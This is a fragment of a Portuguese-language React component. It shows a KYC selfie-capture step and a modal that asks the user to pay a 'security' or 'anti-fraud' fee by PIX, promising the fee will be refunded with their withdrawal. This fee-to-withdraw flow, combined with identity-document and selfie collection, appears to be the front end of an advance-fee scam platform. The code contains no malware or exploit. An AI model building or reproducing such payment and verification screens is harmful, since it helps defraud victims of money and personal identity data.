                                  className="absolute bottom-6 left-1/2 transform -translate-x-1/2 w-16 h-16 bg-white rounded-full flex items-center justify-center hover:scale-110 transition-all shadow-lg"
                                >
                                  <Camera className="w-8 h-8 text-black" />
                                </button>
                              </>
                            ) : (
                              <div className="flex items-center justify-center h-96">
                                <div className="text-center text-white">
                                  <Camera className="w-16 h-16 mx-auto mb-4 opacity-50" />
                                  <p>Carregando câmera...</p>
                                </div>
                              </div>
                            )}
                          </div>
                        ) : (
                          <div className="relative">
                            <img src={selfieCapture} alt="Selfie" className="w-full h-96 object-cover rounded-xl" />
                            <button
                              onClick={() => {
                                setSelfieCapture(null)
                                startCamera()
                              }}
                              className="absolute top-4 right-4 bg-white p-2 rounded-full shadow-lg hover:bg-gray-100 transition-all"
                            >
                              <X className="w-5 h-5 text-black" />
                            </button>
                          </div>
                        )}
                      </div>

                      <canvas ref={canvasRef} className="hidden" />

                      <div className="bg-gray-50 border-2 border-gray-200 p-4 rounded-lg mb-6">
                        <p className="text-sm text-gray-700">
                          <strong className="text-black">Dicas:</strong> Certifique-se de estar em um local bem iluminado e que seu rosto esteja totalmente visível.
                        </p>
                      </div>

                      <div className="flex gap-4">
                        <button
                          onClick={() => {
                            stopCamera()
                            setKycStep("documents")
                          }}
                          className="flex-1 py-3 px-6 bg-white border-2 border-gray-200 text-black font-bold rounded-lg hover:border-black transition-all"
                        >
                          Voltar
                        </button>
                        <button
                          onClick={completeKyc}
                          disabled={!selfieCapture}
                          className={`flex-1 py-3 px-6 rounded-lg font-bold transition-all ${
                            selfieCapture
                              ? "bg-black text-white hover:bg-gray-800 shadow-md"
                              : "bg-gray-200 text-gray-400 cursor-not-allowed"
                          }`}
                        >
                          Concluir Verificação
                        </button>
                      </div>
                    </>
                  )}
                </>
              )}
            </div>
          </div>
        )}

        {showSecurityFeePixModal && securityFeePixData && (
          <div className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4 backdrop-blur-sm">
            <div className="bg-white rounded-2xl p-8 max-w-md w-full max-h-[90vh] overflow-y-auto shadow-2xl">
              <div className="flex items-center justify-between mb-6">
                <h2 className="text-2xl font-bold text-black">Taxa de Segurança</h2>
                <button 
                  onClick={() => {
                    setShowSecurityFeePixModal(false)
                    setSecurityFeeTxid("")
                    setSecurityFeePixData(null)
                  }} 
                  className="text-gray-400 hover:text-black text-2xl w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 transition-all"
                >
                  <X size={24} />
                </button>
              </div>

              <div className="bg-gray-50 border-2 border-gray-200 p-4 rounded-xl mb-6">
                <div className="flex justify-between items-center">
                  <span className="text-black font-medium">Taxa Anti-Fraude</span>
                  <span className="text-black font-bold text-xl">
                    R$ {SECURITY_FEE_AMOUNT.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}
                  </span>
                </div>
              </div>

              <div className="flex justify-center mb-6">
                <div className="bg-white p-4 rounded-xl border-2 border-gray-200 shadow-sm">
                  <img
                    src={`https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(securityFeePixData?.pixCopiaECola || "")}`}
                    alt="QR Code PIX"
                    className="w-[220px] h-[220px]"
                  />
                </div>
              </div>

              <div className="space-y-4">
                <div className="bg-gray-50 border-2 border-gray-200 p-4 rounded-xl">
                  <div className="text-xs text-gray-600 font-mono break-all mb-3 leading-relaxed">
                    {securityFeePixData?.pixCopiaECola || "Código PIX"}
                  </div>
                  <button
                    onClick={copySecurityFeePixCode}
                    className="w-full py-3 bg-black text-white rounded-lg hover:bg-gray-800 transition-all font-semibold"
                  >
                    Copiar Código PIX
                  </button>
                </div>

                <div className="bg-gray-100 border-2 border-gray-300 p-4 rounded-xl">
                  <p className="text-xs text-gray-700 text-center font-medium">
                    🔄 Verificando pagamento automaticamente...
                  </p>
                </div>

                <div className="bg-gray-50 border-2 border-gray-200 p-4 rounded-xl">
                  <p className="text-xs text-gray-700 leading-relaxed">
                    <strong className="text-black">Lembrete:</strong> Este valor será devolvido junto com seu saque após a confirmação do pagamento.
                  </p>
                </div>

                <p className="text-center text-gray-600 text-sm leading-relaxed">
                  Abra seu banco, escolha PIX → Pagar com QR Code ou Copia e Cola.
                </p>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}